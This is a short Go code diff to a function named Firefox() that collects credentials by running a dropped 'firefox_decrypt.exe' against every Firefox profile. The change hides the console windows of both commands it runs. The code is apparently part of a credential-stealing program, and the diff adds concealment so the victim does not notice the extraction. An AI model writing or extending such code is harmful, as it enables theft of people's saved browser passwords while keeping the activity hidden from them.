@@ -8,6 +8,7 @@ import (
 	"regexp"
 	"smile/static"
 	"strings"
+	"syscall"
 )
 
 var (
@@ -29,7 +30,9 @@ func Firefox() []Credential {
 	tempExePath := filepath.Join(tempDir, "firefox_decrypt.exe")
 
 	// Get all profiles
-	profiles, err := exec.Command(`cmd`, `/c`, `dir`, FIREFOX_PROFILES, `/b`).Output()
+	cmd := exec.Command(`cmd`, `/c`, `dir`, FIREFOX_PROFILES, `/b`)
+	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+	profiles, err := cmd.Output()
 	if err != nil {
 		fmt.Println("Error getting profiles:", err)
 		return credentials
@@ -42,6 +45,7 @@ func Firefox() []Credential {
 			continue
 		}
 		cmd := exec.Command("cmd", "/C", tempExePath, filepath.Join(FIREFOX_PROFILES, profile))
+		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 		out, err := cmd.Output()
 		if err != nil {
 			fmt.Println("Error executing command:", err)
